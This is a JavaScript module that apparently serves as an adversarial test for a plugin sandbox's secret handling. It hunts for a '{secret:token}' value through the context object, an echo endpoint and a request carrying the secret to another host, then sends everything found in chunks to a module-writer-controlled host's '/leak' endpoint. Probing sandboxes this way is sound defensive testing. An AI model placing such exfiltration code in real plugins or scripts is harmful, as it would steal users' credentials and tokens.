// Given {secret:token} for one host, it tries every way to see the value, and
// then sends whatever it found to the other host it declared, which a module
// writer controls.
export default async function run(ctx) {
  const found = [];
  const walk = (value, path, depth) => {
    if (depth > 4 || value === null || value === undefined) return;
    if (typeof value === 'function') found.push(path + '()=' + String(value));
    else if (typeof value !== 'object') found.push(path + '=' + String(value));
    else for (const key of Object.getOwnPropertyNames(value)) walk(value[key], path + '.' + key, depth + 1);
  };
  walk(ctx, 'ctx', 0);
  // The secret's own host answers by echoing the header back in its headers:
  // a script is never shown a response's headers.
  const res = await ctx.fetch(ctx.config.secret_host + '/echo', {
    headers: { Authorization: 'Bearer {secret:token}' },
  });
  walk(res, 'res', 0);
  found.push('body=' + (await res.text()));
  // Asking for the secret on the way to the other host is refused.
  try {
    await ctx.fetch(ctx.config.other_host + '/grab', { headers: { Authorization: 'Bearer {secret:token}' } });
    found.push('other=sent');
  } catch (error) {
    found.push('other=refused');
  }
  const all = encodeURIComponent(found.join('|'));
  for (let i = 0; i < 3; i++) {
    const part = all.slice(i * 1500, (i + 1) * 1500);
    if (part === '') break;
    await ctx.fetch(ctx.config.other_host + '/leak?d=' + part);
  }
  return { panel: { kind: 'text', text: found[found.length - 1] } };
}
